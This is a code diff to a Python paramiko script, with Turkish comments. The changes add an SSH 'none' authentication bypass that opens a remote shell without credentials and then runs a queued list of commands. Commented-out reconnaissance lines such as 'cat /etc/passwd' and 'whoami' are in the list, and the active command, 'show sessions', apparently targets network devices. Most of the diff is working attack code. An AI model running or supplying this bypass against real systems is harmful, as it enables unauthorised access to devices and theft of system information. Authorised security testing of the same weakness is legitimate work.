@@ -1,5 +1,40 @@
-#!/bin/python3.6
-import paramiko, argparse,time,socket,os,platform
+import paramiko, argparse, time, socket, os, platform, logging
+#logging.getLogger("paramiko").setLevel(logging.WARNING)
+#paramiko.util.log_to_file("paramiko_log_file", level = "DEBUG")
+
+command_list = []
+
+
+
+# ÇALIŞTIRILACAK KOMUTLAR
+############################################################
+
+# command_list.append("whoami\n")
+# command_list.append("uname -a\n")
+# command_list.append("ls -la\n")
+# command_list.append("dir\n")
+# command_list.append("pwd\n")
+# command_list.append("cat /etc/passwd\n")
+
+command_list.append("show sessions\n")
+# command_list.append("pwd\n")
+# command_list.append("\n")
+# command_list.append("\n")
+# command_list.append("dir\n")
+# command_list.append("cd system\n")
+# command_list.append("dir\n")
+# command_list.append("pwd\n")
+# command_list.append("show interfaces counter GigabitEthernet 1\n")
+
+
+
+
+
+
+############################################################
+
+
+
 
 def paint(text,color):
 	GREEN = '\033[92m'
@@ -79,14 +114,29 @@ def test_connection(host,port,username,password,timeout):
 		ssh.close()
 		return True
 
-	except paramiko.AuthenticationException as exception:
-		print(paint("[-] ","RED") + "Authentication failed => " +host+":"+str(port))
-		
-		return False
+	except paramiko.ssh_exception.BadAuthenticationType as ex:
+		print(paint("[*] ","BLUE") + "\"None Authentication Method\" detected. Changing test strategy...")
+		try:
+			print(paint("[*] ","BLUE") + "Sending None Authentication request...")
+			ssh.connect(hostname=host)
+			print(paint("[-] ","RED") + "Unpredictable Situation.")
+			return False
+
+		except Exception as exception1:
+			try:
+				ssh.get_transport().auth_none(username)
+				print(paint("[+] ","GREEN") + "Authentication bypassed successfully.")
+				rm=ssh.invoke_shell()
+				time.sleep(0.5)
+				print(paint("[?] ","YELLOW") + "Successfull to reach the shell but could not control the credetials when \"None Authentication\" enabled. You should control manually.")
+				return True
+
+			except Exception as exception2:
+				print(paint("[-] ","RED") + str(exception2))
+				return False
 
 	except Exception as exception:
 		print(paint("[-] ","RED") + "Failed to connect => " +host+":"+str(port)+" ("+str(exception)+")")
-
 		return False
 
 	finally:
@@ -98,13 +148,15 @@ def activate_shell(host,port,username,password,timeout):
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	try:
 		print(paint("[*] ","BLUE") + "Preparing for execution... ")
-		ssh.connect(hostname=host,port=port,username=username,password=password,timeout=timeout)
+		ssh.connect(hostname=host,port=port,username=username,password=password,timeout=timeout,allow_agent=False,look_for_keys=False)
 		print(paint("[+] ","GREEN") +"Established connection => " +host+":"+str(port))
-		########################################################################################
 		rm=ssh.invoke_shell()
-		rm.send("uname -a\n")
+		time.sleep(0.5)
 
-		#########################################################################################
+		for command in command_list:
+			rm.send(command)
+			time.sleep(0.3)
+
 
 		time.sleep(1)
 		output = str(rm.recv(131989504))
@@ -114,6 +166,46 @@ def activate_shell(host,port,username,password,timeout):
 		print(output)
 		print()
 		print(paint("[+] ","GREEN") + "Command execution succeed")
+
+	except paramiko.ssh_exception.BadAuthenticationType as ex:
+			print(paint("[*] ","BLUE") + "\"None Authentication Method\" detected. Changing running strategy...")
+			try:
+				print(paint("[*] ","BLUE") + "Sending None Authentication request...")
+				ssh.connect(hostname=host)
+				print(paint("[-] ","RED") + "Unpredictable Situation.")
+				return False
+
+			except Exception as exception1:
+				try:
+					ssh.get_transport().auth_none(username)
+					print(paint("[+] ","GREEN") + "Authentication bypassed successfully, again.")
+					print(paint("[*] ","BLUE") + "Invoking the shell...")
+					rm=ssh.invoke_shell()
+					time.sleep(0.5)
+					rm.send(username+"\n")
+					time.sleep(0.5)
+					rm.send(password+"\n")
+					time.sleep(0.8)
+
+					for command in command_list:
+						rm.send(command)
+						time.sleep(0.3)
+
+					time.sleep(1)
+
+					output = str(rm.recv(131989504))
+					output=output.replace("\\r\\n", "\n")[2:]
+					output=output.replace("\\r","")
+					output=output[0:len(output)-1]
+					print()
+					print(output)
+					print()
+					print(paint("[+] ","GREEN") + "Command execution succeed")
+					return True
+
+				except Exception as exception2:
+					print(paint("[-] ","RED") + str(exception2))
+					return False
 
 	except Exception as exception:
 		print(paint("[-] ","RED") + "Crashed => " +host+":"+str(port)+" ("+str(exception)+")")
@@ -136,15 +228,12 @@ def main():
 	port = args.port
 	username = args.username
 	password = args.password
-
+	
 	get_banner(host,port,timeout)
 	if(test_connection(host,port,username,password,timeout) is False):
 		print(paint("[*] ","BLUE") + "Exiting...")
 	else:
 		activate_shell(host,port,username,password,timeout)
-
-
-
 
 
 if __name__ == "__main__":
